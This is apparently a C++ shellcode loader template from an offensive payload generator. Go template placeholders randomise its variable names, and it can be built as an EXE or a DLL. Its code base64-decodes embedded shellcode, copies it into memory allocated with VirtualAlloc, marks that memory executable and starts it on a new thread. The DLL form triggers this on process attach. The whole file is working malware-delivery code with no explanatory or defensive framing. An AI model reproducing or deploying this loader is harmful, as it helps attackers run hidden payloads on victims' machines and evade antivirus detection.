#include <windows.h>
#include <iostream>
#include <vector>

#include "shellcode.h"
#include "util.h"

{{ if eq .Format "dll" }}

BOOL WINAPI DllMain(HINSTANCE {{ index .V "hInst" }}, DWORD {{ index .V "fdwReason" }}, LPVOID {{ index .V "lpvReserved" }}) {
if ({{ index .V "fdwReason" }} != DLL_PROCESS_ATTACH)
	return true;

{{ else if eq .Format "exe" }}
	
int main(int {{ index .V "argc" }}, char** {{ index .V "argv" }}) {

{{ end }}

	std::vector<char> {{ index .V "buffer" }} = {{ index .V "base64_decode" }}({{ index .V "shellcode" }}, {{ index .V "shellcodeLen" }});
	int {{ index .V "bufferSize" }} = {{ index .V "buffer" }}.size();

	LPVOID {{ index .V "addressPointer" }} = VirtualAlloc(NULL, {{ index .V "bufferSize" }}, 0x3000, 0x40);
	memcpy({{ index .V "addressPointer" }}, &{{ index .V "buffer" }}[0], {{ index .V "bufferSize" }});

	DWORD {{ index .V "dummy" }};
	::VirtualProtect({{ index .V "addressPointer" }}, {{ index .V "bufferSize" }}, PAGE_EXECUTE_READ, &{{ index .V "dummy" }});
	HANDLE {{ index .V "hThread" }} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){{ index .V "addressPointer" }}, NULL, 0, 0);

	{{ if eq .Format "exe" }}
	WaitForSingleObject({{ index .V "hThread" }}, INFINITE);
	{{ end }}

	return true;
}

